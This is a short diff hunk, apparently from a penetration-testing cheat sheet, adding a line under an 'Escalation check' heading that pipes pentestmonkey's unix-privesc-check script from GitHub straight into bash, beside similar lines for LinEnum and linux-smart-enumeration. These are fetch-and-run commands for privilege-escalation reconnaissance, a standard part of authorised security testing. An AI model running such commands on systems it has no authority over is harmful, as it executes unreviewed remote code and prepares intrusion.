@@ -49,5 +49,7 @@ bash <(curl -s https://raw.githubusercontent.com/diego-treitos/linux-smart-enume
 Escalation check
 
 bash <(curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
+
+bash <(curl -s https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh)
 ################
 ###############
